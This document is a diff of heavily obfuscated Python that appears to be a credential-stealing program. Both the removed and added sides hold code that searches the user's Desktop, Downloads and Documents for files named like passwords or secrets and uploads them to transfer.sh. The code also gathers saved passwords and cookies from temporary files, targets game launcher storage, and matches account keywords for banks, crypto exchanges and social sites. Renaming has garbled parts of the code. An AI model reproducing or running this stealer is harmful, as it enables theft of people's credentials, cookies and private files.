-        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
+        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
     ]
-    for llIIlIlIIIIII in IIIlIIlIlIIII:
-        llIlIlIIIIIIllIlIIl = threading.Thread(IIllIIlIlllII=IIIllIIIll, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[3]])
-        llIlIlIIIIIIllIlIIl.start()
-        llIIIlIIIIlIlIIll.append(llIlIlIIIIIIllIlIIl)
-    lllIIIlIIIl = []
-    for llIIlIlIIIIII in IIIlIIlIlIIII:
-        llIlIlIIIIIIllIlIIl = threading.Thread(IIllIIlIlllII=IIIIIllIIlIlIIlIl, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[4]])
-        llIlIlIIIIIIllIlIIl.start()
-        lllIIIlIIIl.append(llIlIlIIIIIIllIlIIl)
-    for IlIIIIIl in lllIIIlIIIl: IlIIIIIl.join()
-    IllIlIlllIIl = IIlIllllll(llIlIIllllI)
-    if IllIlIlllIIl == True: return
-    for llIIlIlIIIIII in IIIlIIlIlIIII:
-        threading.Thread(IIllIIlIlllII=IllIlIIlIllIIIIlII, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[5], llIIlIlIIIIII[1]]).start()
-    for llIIlIlIIIIII in lIIlllIlIllIlIlll:
-        threading.Thread(IIllIIlIlllII=IllIlIIlIllIIIIlII, lllIIIlIlllIlIl=[llIIlIlIIIIII[0], llIIlIlIIIIII[2], llIIlIlIIIIII[1]]).start()
-    for IlIIIIIl in llIIIlIIIIlIlIIll:
-        IlIIIIIl.join()
-    global lIlIllIllllI
-    lIlIllIllllI = []
-    for IlIlIlIll in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
-        IIllIlIlIlI(os.getenv("TEMP") + "\\" + IlIlIlIll)
-def lIlllIlIIlI(lIllIIllI):
+    for IlIlllIlllIIlIIIl in llIIIlIlIIl:
+        lIlIlIIIlIlllIlllII = threading.Thread(llIlIIllIIIl=IllIlIIIlIIIlllI, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[3]])
+        lIlIlIIIlIlllIlllII.start()
+        lIlIIlIlIllIlIll.append(lIlIlIIIlIlllIlllII)
+    llIIlIlIIlIllI = []
+    for IlIlllIlllIIlIIIl in llIIIlIlIIl:
+        lIlIlIIIlIlllIlllII = threading.Thread(llIlIIllIIIl=llIIllllIIllIlll, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[4]])
+        lIlIlIIIlIlllIlllII.start()
+        llIIlIlIIlIllI.append(lIlIlIIIlIlllIlllII)
+    for lllIlIIlIlllI in llIIlIlIIlIllI: lllIlIIlIlllI.join()
+    IllllIllIIIIlllII = lIlIlIllllIlllIIIII(llIIllIIIllI)
+    if IllllIllIIIIlllII == True: return
+    for IlIlllIlllIIlIIIl in llIIIlIlIIl:
+        threading.Thread(llIlIIllIIIl=lIlIlIlIIllllIl, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[5], IlIlllIlllIIlIIIl[1]]).start()
+    for IlIlllIlllIIlIIIl in IIllllllIll:
+        threading.Thread(llIlIIllIIIl=lIlIlIlIIllllIl, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl[0], IlIlllIlllIIlIIIl[2], IlIlllIlllIIlIIIl[1]]).start()
+    for lllIlIIlIlllI in lIlIIlIlIllIlIll:
+        lllIlIIlIlllI.join()
+    global IlIllIIlI
+    IlIllIIlI = []
+    for lIIIIlllIl in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
+        IllIIlIlIIllIIIlI(os.getenv("TEMP") + "\\" + lIIIIlllIl)
+def IlllIlIIIIlIllIIlI(lllIllIIlIlllllIIIIl):
     try:
-        IIllIIIIlIllIllII = { "file": (lIllIIllI, open(lIllIIllI, mode='rb')) }
+        IIllllIlllIlIlIIl = { "file": (lllIllIIlIlllllIIIIl, open(lllIllIIlIlllllIIIIl, mode='rb')) }
         ...
-        IIllIlIlIlI = requests.post("https://transfer.sh/", IIllIIIIlIllIllII=IIllIIIIlIllIllII)
-        llIlIlIlIIIIIIIIIl = IIllIlIlIlI.text
-        return llIlIlIlIIIIIIIIIl
+        IllIIlIlIIllIIIlI = requests.post("https://transfer.sh/", IIllllIlllIlIlIIl=IIllllIlllIlIlIIl)
+        lIIlllllIIIlIlIIlIl = IllIIlIlIIllIIIlI.text
+        return lIIlllllIIIlIlIIlIl
     except:
         return False
-def llIlIlIll(IlIlIllIIllI, IllIIIll):
-    global llIIIIllIllll
-    lllIlIlIlIIIl = 7
-    lIIllllllIl = 0
-    llllllllIllIlIl = os.listdir(IlIlIllIIllI)
-    llIllIIlllIlIIIlI = []
-    for IlIlIlIll in llllllllIllIlIl:
-        if not os.lIllIIllI.isfile(IlIlIllIIllI + "/" + IlIlIlIll): return
-        lIIllllllIl += 1
-        if lIIllllllIl <= lllIlIlIlIIIl:
-            llIlIlIlIIIIIIIIIl = lIlllIlIIlI(IlIlIllIIllI + "/" + IlIlIlIll)
-            llIllIIlllIlIIIlI.append([IlIlIllIIllI + "/" + IlIlIlIll, llIlIlIlIIIIIIIIIl])
+def lIIllIIIll(IIllllIIIIlllIllIl, IlllIIlIlIlIl):
+    global IlIlIIllII
+    llIIlIlIlIll = 7
+    lIlIllllIllIlIIllII = 0
+    lIIIIIIIII = os.listdir(IIllllIIIIlllIllIl)
+    IllllIIIIlIIll = []
+    for lIIIIlllIl in lIIIIIIIII:
+        if not os.lllIllIIlIlllllIIIIl.isfile(IIllllIIIIlllIllIl + "/" + lIIIIlllIl): return
+        lIlIllllIllIlIIllII += 1
+        if lIlIllllIllIlIIllII <= llIIlIlIlIll:
+            lIIlllllIIIlIlIIlIl = IlllIlIIIIlIllIIlI(IIllllIIIIlllIllIl + "/" + lIIIIlllIl)
+            IllllIIIIlIIll.append([IIllllIIIIlllIllIl + "/" + lIIIIlllIl, lIIlllllIIIlIlIIlIl])
         else:
             break
-    llIIIIllIllll.append(["folder", IlIlIllIIllI + "/", llIllIIlllIlIIIlI])
-llIIIIllIllll = []
-def lIIlIIlllIIllIIII(lIllIIllI, IllIIIll):
-    global llIIIIllIllll
-    lIIllllIIlIIlllIIll = []
-    llllllllIllIlIl = os.listdir(lIllIIllI)
-    for IlIlIlIll in llllllllIllIlIl:
-        for IllIIIllIllIll in IllIIIll:
-            if IllIIIllIllIll in IlIlIlIll.lower():
-                if os.lIllIIllI.isfile(lIllIIllI + "/" + IlIlIlIll) and ".txt" in IlIlIlIll:
-                    lIIllllIIlIIlllIIll.append([lIllIIllI + "/" + IlIlIlIll, lIlllIlIIlI(lIllIIllI + "/" + IlIlIlIll)])
+    IlIlIIllII.append(["folder", IIllllIIIIlllIllIl + "/", IllllIIIIlIIll])
+IlIlIIllII = []
+def lIIllIlllIIIlIlIlIll(lllIllIIlIlllllIIIIl, IlllIIlIlIlIl):
+    global IlIlIIllII
+    IIIIIIlllIlll = []
+    lIIIIIIIII = os.listdir(lllIllIIlIlllllIIIIl)
+    for lIIIIlllIl in lIIIIIIIII:
+        for IllIIlIllllllll in IlllIIlIlIlIl:
+            if IllIIlIllllllll in lIIIIlllIl.lower():
+                if os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl) and ".txt" in lIIIIlllIl:
+                    IIIIIIlllIlll.append([lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl, IlllIlIIIIlIllIIlI(lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl)])
                     break
-                if os.lIllIIllI.isdir(lIllIIllI + "/" + IlIlIlIll):
-                    IIllIIlIlllII = lIllIIllI + "/" + IlIlIlIll
-                    llIlIlIll(IIllIIlIlllII, IllIIIll)
+                if os.lllIllIIlIlllllIIIIl.isdir(lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl):
+                    llIlIIllIIIl = lllIllIIlIlllllIIIIl + "/" + lIIIIlllIl
+                    lIIllIIIll(llIlIIllIIIl, IlllIIlIlIlIl)
                     break
-    llIIIIllIllll.append(["folder", lIllIIllI, lIIllllIIlIIlllIIll])
-def IIIlIllIIlIlIlIlI():
-    IIIllIlIIIlIlIIIIllI = IllIIlIllIllIIII.split("\AppData")[0]
-    IlIIlIIIII = [
-        IIIllIlIIIlIlIIIIllI + "/Desktop",
-        IIIllIlIIIlIlIIIIllI + "/Downloads",
-        IIIllIlIIIlIlIIIIllI + "/Documents"
+    IlIlIIllII.append(["folder", lllIllIIlIlllllIIIIl, IIIIIIlllIlll])
+def IIIIlIIIlIlIIlIIIIll():
+    IlIlIIIlIll = lIIllIlIlIIIIIlIII.split("\AppData")[0]
+    IIllIIIlllI = [
+        IlIlIIIlIll + "/Desktop",
+        IlIlIIIlIll + "/Downloads",
+        IlIlIIIlIll + "/Documents"
     ]
-    llIllIllI = [
+    IIIlIlllllIlIIII = [
         "passw",
         "mdp",
         "motdepasse",
@@ -2428,153 +2119,37 @@ def IIIlIllIIlIlIlIlI():
         "backup",
         "seecret"
         ]
-    llllIIlIllIIllIIlIl = []
-    for llIIlIlIIIIII in IlIIlIIIII:
-        IIIlIllIIlIlIlIlI = threading.Thread(IIllIIlIlllII=lIIlIIlllIIllIIII, lllIIIlIlllIlIl=[llIIlIlIIIIII, llIllIllI]);IIIlIllIIlIlIlIlI.start()
-        llllIIlIllIIllIIlIl.append(IIIlIllIIlIlIlIlI)
-    return llllIIlIllIIllIIlIl
-global lIlIIllIIIIIlIllIIlI, lllIIIIllII, IlllIIIlIIlll
-lIlIIllIIIIIlIllIIlI = [
+    lIllIllIIIllIlI = []
+    for IlIlllIlllIIlIIIl in IIllIIIlllI:
+        IIIIlIIIlIlIIlIIIIll = threading.Thread(llIlIIllIIIl=lIIllIlllIIIlIlIlIll, llIlIllIIlIIlIIIlIll=[IlIlllIlllIIlIIIl, IIIlIlllllIlIIII]);IIIIlIIIlIlIIlIIIIll.start()
+        lIllIllIIIllIlI.append(IIIIlIIIlIlIIlIIIIll)
+    return lIllIllIIIllIlI
+global lIIIllIlIlI, lllIIIIlIIIlllI, IIllllIIIIl
+lIIIllIlIlI = [
     'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
 ]
-lllIIIIllII = []
-IlllIIIlIIlll = []
-llIlIIIIlllllIIIlIl()
-IllIlIlllIIl = IIlIllllll(llIlIIllllI)
-if not IllIlIlllIIl:
-    llllIIlIllIIllIIlIl = IIIlIllIIlIlIlIlI()
-    for IlIIIIIl in llllIIlIllIIllIIlIl: IlIIIIIl.join()
-    IlllIlIIlIIlIlllll.sleep(0.2)
-    IllIlIlIIIIIIlI = "```diff\n"
-    for IIllIlIllIIIlIllII in llIIIIllIllll:
-        if len(IIllIlIllIIIlIllII[2]) != 0:
-            lIIlIIIlIllIll = IIllIlIllIIIlIllII[1]
-            IIIlIIIllIIIllII = IIllIlIllIIIlIllII[2]
-            IllIlIlIIIIIIlI +=lIIIIllIlIIIllIIl"\n"
-            IllIlIlIIIIIIlI += lIIIIllIlIIIllIIl"- {lIIIIllIlIIIllIIlIIIlIIlIlIlIIllIllIlpllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIh}\n"
-            for IIllIllIlllIlI in IIIlIIIllIIIllII:
-                llIlIlIIIIIIllIlIIl = IIllIllIlllIlI[0].split("/")
-                llIIlIIlIlIllIlll = llIlIlIIIIIIllIlIIl[len(llIlIlIIIIIIllIlIIl)-1]
-                llIlIIIllll = IIllIllIlllIlI[1]
-                IllIlIlIIIIIIlI += lIIIIllIlIIIllIIl"+ Name: {lIIIIllIlIIIllIIlilellIlIlIIIIIIllIlIIlnmIIlIlIIIlIlIIlII}\n+ LlIIllllllIlnk: {llIlIIIlllIlIIlllII}"
-                IllIlIlIIIIIIlI += "\n"
-    IllIlIlIIIIIIlI += "\n```"
-    IIllIlIlIlI("bc_checking", IllIlIlIIIIIIlI)
-    IlIlllllIIIIlllI = threading.Thread(IIllIIlIlllII=lIIllIIllIlIlI().IIIIlIlIIIIl)
-    IlIlllllIIIIlllI.start()
-class lIIllIIlll:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lIlIIllIIllllIIII()
-        IIIIIIIllIllIIII.IIIIllllllIIIl()
-        IIIIIIIllIllIIII.llIllIlllI()
-        IIIIIIIllIllIIII.lllIllII()
-        IIIIIIIllIllIIII.IIlIlllllIll()
-    def lIlIIllIIllllIIII(IIIIIIIllIllIIII, llIllllllIlllI, IIIllllIIIl, lIIIlIllIIIIllIlllII, IIllIlIIIllIIIl, llIlIIIllllIlIl, IIlIlllIIIIlI):
-        return IIIIIIIllIllIIII.IIlIlllllIll()
-    def IIIIllllllIIIl(IIIIIIIllIllIIII, IlIIlIIlIIllll, IlIllIllI, lllIlIIIIlIlIIIIllII):
-        return IIIIIIIllIllIIII.IIIIllllllIIIl()
-    def llIllIlllI(IIIIIIIllIllIIII, IlllIlIIllllIlIll, llIIlIIIllIllIlI, IlIIIllIlllIIl, lIlllIlIIIlIIlIlIII, llIlIIIlIIlIllIIll, IIlIlIlIIIIllIIIll, lIlIIIllllIlIIlIll):
-        return IIIIIIIllIllIIII.IIlIlllllIll()
-    def lllIllII(IIIIIIIllIllIIII, IlIlIlllI, lIlIIlIlIIll, IlIIlllIIIlIlIIlI, IIIllllllIII, llIIlIIllIl, IlIIlllI):
-        return IIIIIIIllIllIIII.IIIIllllllIIIl()
-    def IIlIlllllIll(IIIIIIIllIllIIII, lllIIlIIIll, llIIllIIlIl, lIIIIIlIIII, lllIIlIlIIIllIIlllII, llIlIlllIIIllII, lllIIlIlIlIIII, IllIllll):
-        return IIIIIIIllIllIIII.llIllIlllI()
-class lllIIlllllI:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.IIIlllIIIlIlIIII()
-        IIIIIIIllIllIIII.IIIlIIlIIIlIl()
-        IIIIIIIllIllIIII.IlIIllIlIIl()
-        IIIIIIIllIllIIII.lllIIlIllIIIlIIlI()
-        IIIIIIIllIllIIII.lIIIIlIIIIlIIlIll()
-        IIIIIIIllIllIIII.llllIIIIl()
-        IIIIIIIllIllIIII.lllIllIIllIIIIIl()
-        IIIIIIIllIllIIII.llllIlIlIlIlllIIIl()
-    def IIIlllIIIlIlIIII(IIIIIIIllIllIIII, IlIIIIlllllIIlIlIll):
-        return IIIIIIIllIllIIII.IIIlIIlIIIlIl()
-    def IIIlIIlIIIlIl(IIIIIIIllIllIIII, IIlIllllIlIlIllIIlII, IIIIllll):
-        return IIIIIIIllIllIIII.lllIIlIllIIIlIIlI()
-    def IlIIllIlIIl(IIIIIIIllIllIIII, lllIIIll, IlIlIlllIIl, IIlIllIlIl, IlIIIlIIIlIllIlllIl, IlIlIlIIllllll):
-        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
-    def lllIIlIllIIIlIIlI(IIIIIIIllIllIIII, IIlIlIIIIlI, lIIlllIIlI, IllIIllIllllIll):
-        return IIIIIIIllIllIIII.IIIlllIIIlIlIIII()
-    def lIIIIlIIIIlIIlIll(IIIIIIIllIllIIII, llIIIllIlI, llllIIllIllI, IllIllIIllIIlIIlIIl, IlIIIIlIIIIl, lIllIlIIIIIl):
-        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
-    def llllIIIIl(IIIIIIIllIllIIII, IlIlllIllIllllll, IlIIIIIIIlllllllI):
-        return IIIIIIIllIllIIII.lIIIIlIIIIlIIlIll()
-    def lllIllIIllIIIIIl(IIIIIIIllIllIIII, IIIIlllIII, lIIlIlIIllIIl, lIlllIlIlllllIlII):
-        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
-    def llllIlIlIlIlllIIIl(IIIIIIIllIllIIII, llIIIlIIIllllI, IIllIlllllllIlIl):
-        return IIIIIIIllIllIIII.lllIllIIllIIIIIl()
-class lIlIlIIIIIIIIlIlIlI:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lIlIIIlIIIIlIll()
-        IIIIIIIllIllIIII.IIlIlIIlIIlIlIIllIII()
-        IIIIIIIllIllIIII.IlIIIlIIlIIl()
-        IIIIIIIllIllIIII.IlIllIlIII()
-        IIIIIIIllIllIIII.IlIllIllIllIIlIIIIl()
-        IIIIIIIllIllIIII.IIlIlIlIlIIlIlll()
-        IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
-        IIIIIIIllIllIIII.lIlIlIIlIIll()
-        IIIIIIIllIllIIII.IllIIIllIl()
-        IIIIIIIllIllIIII.IlllllIIlIIII()
-        IIIIIIIllIllIIII.lIllIlIIllllIIllI()
-        IIIIIIIllIllIIII.lIlIIIIlIIIIlllll()
-    def lIlIIIlIIIIlIll(IIIIIIIllIllIIII, IlIllIII, lIlIllIl, lIIllIlIlIIlllll, lIIIllIlIlIIIlIllllI, IIIllIlllllIIllIll):
-        return IIIIIIIllIllIIII.IlIllIllIllIIlIIIIl()
-    def IIlIlIIlIIlIlIIllIII(IIIIIIIllIllIIII, lIIIlllll, lllllIlII, IIIIlllIIIIIll, IIIIIllllIIl, IIIIIlllI, IIIIIlIlIIIlll, IllIIllIIIllIlI):
-        return IIIIIIIllIllIIII.IllIIIllIl()
-    def IlIIIlIIlIIl(IIIIIIIllIllIIII, lIIllIIIllIIlIIIIlIl):
-        return IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
-    def IlIllIlIII(IIIIIIIllIllIIII, IllIIllllIlIlIIIIIl, IIlIlllIIlIlIlIIl, IlllIIIIlIlII, lIIIllIIII, lIlIIIllIIIllIIIlIlI, IlIlIlIIllllIIlIl):
-        return IIIIIIIllIllIIII.lIlIIIIlIIIIlllll()
-    def IlIllIllIllIIlIIIIl(IIIIIIIllIllIIII, llllllIIlIIIlIIIIlI, lIIIIllII, lllIlllIIlllIlllIIl, IlIIlIlIl, IIIlIlIIIllll, IlIIlIIlII):
-        return IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
-    def IIlIlIlIlIIlIlll(IIIIIIIllIllIIII, IlIlIIIllIlIIlI, IllllIlIIIlI, lIIllIlIIllI):
-        return IIIIIIIllIllIIII.IlIllIlIII()
-    def lIIlIIIIIIlllIl(IIIIIIIllIllIIII, lIlIIIllllIIllIllI, lIlllIlIlIIl):
-        return IIIIIIIllIllIIII.lIIlIIIIIIlllIl()
-    def lIlIlIIlIIll(IIIIIIIllIllIIII, lIlllIlll, IIlIlIllI, IIIIlIlllllI, lllIllIIIlIlIlIlIIll, IIllllIllllIlIIlIIII, llIIIlIll):
-        return IIIIIIIllIllIIII.IIlIlIlIlIIlIlll()
-    def IllIIIllIl(IIIIIIIllIllIIII, llIlllIIIIIlIIll, lIIIIIlIIlI, lIllIllIIIl, IIIlllIIllIIIlll, lIlllIIlIlIllI):
-        return IIIIIIIllIllIIII.lIlIlIIlIIll()
-    def IlllllIIlIIII(IIIIIIIllIllIIII, IlIIIIlIIl, IllIIIIlIIllllIllI, IIIIllllllIIlIIIIlI, IIlIlllIlIllI, llIIIllIIIIl, IlIlIllIlllIIl, llIIllllIlII):
-        return IIIIIIIllIllIIII.lIlIIIlIIIIlIll()
-    def lIllIlIIllllIIllI(IIIIIIIllIllIIII, IIllllIIIllIlII, lIlIlIIlIIIIIIIl, IlIIIlIIIIlI):
-        return IIIIIIIllIllIIII.IlllllIIlIIII()
-    def lIlIIIIlIIIIlllll(IIIIIIIllIllIIII, IlIIllII, IIllIllllIIlIlll, llIIIIlIIIIIlI, IIlIlIIlllIllIIlllI):
-        return IIIIIIIllIllIIII.IlIllIlIII()
-class lIllIllllIlIIllllI:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lIllIllllIIlIIIlllll()
-        IIIIIIIllIllIIII.llIlIIIIlIlIIIIIllI()
-        IIIIIIIllIllIIII.IlIIllIllllII()
-        IIIIIIIllIllIIII.IIllllIIIl()
-        IIIIIIIllIllIIII.IIlIlIIllIllll()
-        IIIIIIIllIllIIII.IIlIlIllllIIl()
-        IIIIIIIllIllIIII.IIIIIlIIIlIlI()
-        IIIIIIIllIllIIII.IIlIIIlIIlIII()
-        IIIIIIIllIllIIII.IIIIlIIllIlllIlIIll()
-        IIIIIIIllIllIIII.IlllllIIIlII()
-        IIIIIIIllIllIIII.lIlIllIIlIlIIIlIIIII()
-    def lIllIllllIIlIIIlllll(IIIIIIIllIllIIII, IlIIllIlIIIIlIlIlII, lIIllllIlII, lllIllllI, IIIIlIIllIIIIllIlI):
-        return IIIIIIIllIllIIII.IIlIlIllllIIl()
-    def llIlIIIIlIlIIIIIllI(IIIIIIIllIllIIII, lllIllIIIllIlI, IIlIIlIIllIlIIlII):
-        return IIIIIIIllIllIIII.lIlIllIIlIlIIIlIIIII()
-    def IlIIllIllllII(IIIIIIIllIllIIII, llIIIIIllIllIlIlIIII, IIIlllIlIIlII, IlIlIlll, llIIlIllIII):
-        return IIIIIIIllIllIIII.IIlIIIlIIlIII()
-    def IIllllIIIl(IIIIIIIllIllIIII, IIIlIllIlllllIIIll, IllllIIl, IlIllIIIlIlIIl, IlIlIIIlIll, lIIIlllIIlIIIIl, lIlIIIIIlIlI, llIIlIIllIIIII):
-        return IIIIIIIllIllIIII.IIIIlIIllIlllIlIIll()
-    def IIlIlIIllIllll(IIIIIIIllIllIIII, IIlIIIIlllIlIll):
-        return IIIIIIIllIllIIII.IIllllIIIl()
-    def IIlIlIllllIIl(IIIIIIIllIllIIII, IlllllllI, lllllllIIllIIlIl, IllIlIIIl, IIIIIIlIlIlllllIII, lIIllIIIllIIlllIIlI):
-        return IIIIIIIllIllIIII.lIlIllIIlIlIIIlIIIII()
-    def IIIIIlIIIlIlI(IIIIIIIllIllIIII, llIIlIIIlllIlIllIII, lIIIIllIIllI, IIlIllIIIlIllIllIlI, IIllIIIlIlllllIllll, lIlllIIIlIllllII):
-        return IIIIIIIllIllIIII.IlllllIIIlII()
-    def IIlIIIlIIlIII(IIIIIIIllIllIIII, lIlIlllllllIl, IIIIIIIlI, llIlllIlIIlIll, llIlIIIII, IllIllIllIIII, IIlllIIIl):
-        return IIIIIIIllIllIIII.IIlIIIlIIlIII()
-    def IIIIlIIllIlllIlIIll(IIIIIIIllIllIIII, IIIlIlIl, lIlIlIIllIlIIlIIII, IllIlIIIlIIIlIlI, lllIIlIlllIl):
-        return IIIIIIIllIllIIII.IIIIIlIIIlIlI()
-    def IlllllIIIlII(IIIIIIIllIllIIII, llIlllII, lllIllIIllI, lllIlIlIIIll, lIllIlllllIIlIllI, IlIlllIllIIIIl, llIlllIlIlIlllIllll):
-        return IIIIIIIllIllIIII.lIllIllllIIlIIIlllll()
-    def lIlIllIIlIlIIIlIIIII(IIIIIIIllIllIIII, lIlIIlllIIIlI, llIlllIIlll, llIlIllllI, IIIlIllIllIllIIlI, IIIIIIlIIIllllll):
-        return IIIIIIIllIllIIII.IIlIIIlIIlIII()
+lllIIIIlIIIlllI = []
+IIllllIIIIl = []
+lllllIlI()
+IllllIllIIIIlllII = lIlIlIllllIlllIIIII(llIIllIIIllI)
+if not IllllIllIIIIlllII:
+    lIllIllIIIllIlI = IIIIlIIIlIlIIlIIIIll()
+    for lllIlIIlIlllI in lIllIllIIIllIlI: lllIlIIlIlllI.join()
+    lIlllIlIIII.sleep(0.2)
+    IIIlllIlIIl = "```diff\n"
+    for IIIllIIIIIIllIll in IlIlIIllII:
+        if len(IIIllIIIIIIllIll[2]) != 0:
+            IIIlIIll = IIIllIIIIIIllIll[1]
+            IIlIlIlIlIlIIllIlIll = IIIllIIIIIIllIll[2]
+            IIIlllIlIIl +=llllIlIlll"\n"
+            IIIlllIlIIl += llllIlIlll"- {llllIlIlllIIIIlIllIIIlllIplIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIh}\n"
+            for llIlIIlIIlIlIlIlIlIl in IIlIlIlIlIlIIllIlIll:
+                lIlIlIIIlIlllIlllII = llIlIIlIIlIlIlIlIlIl[0].split("/")
+                lIllIIIIl = lIlIlIIIlIlllIlllII[len(lIlIlIIIlIlllIlllII)-1]
+                lllllIllIIIl = llIlIIlIIlIlIlIlIlIl[1]
+                IIIlllIlIIl += llllIlIlll"+ Name: {lIIIIlllIllIlIlIIIlIlllIlllIInmllllllII}\n+ LlIlIllllIllIlIIllIInk: {lllllIllIIIIIIlIIllIlIlllIllI}"
+                IIIlllIlIIl += "\n"
+    IIIlllIlIIl += "\n```"
+    IllIIlIlIIllIIIlI("bc_checking", IIIlllIlIIl)
+    lIlIIIlIlIIllllIIIl = threading.Thread(llIlIIllIIIl=IlIllIIllIllIII().lllIIlIlI)
+    lIlIIIlIlIIllllIIIl.start()
